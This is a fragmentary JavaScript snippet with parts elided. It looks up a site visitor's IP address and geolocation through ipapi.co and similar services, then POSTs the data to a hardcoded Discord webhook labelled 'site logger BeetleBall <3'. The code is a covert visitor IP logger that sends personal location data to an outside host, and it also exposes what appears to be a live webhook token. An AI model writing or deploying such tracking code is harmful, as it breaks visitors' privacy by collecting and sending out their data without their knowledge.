        ...
        .then(([ipapi, ipinfo, ipdata]) => {
            ...
            console.log("Flags:", flags);
                ...
                return fetch(`https://ipapi.co/${ipadd}/json/`)
                    ...
                    .then(geoData => {
                        const dscURL = 'https://discord.com/api/webhooks/1443241738499133625/5q7gMZ01_7yDXd9Va2cGH6JHQtZiJ5KR_q4viHWNjFHdeNsQyrqx9rwOHokEkDkNUXzz'; 
                        return fetch(dscURL, {
                            method: 'POST',
                            headers: {
                            ...
                            body: JSON.stringify({
                                username: "site logger BeetleBall <3", 
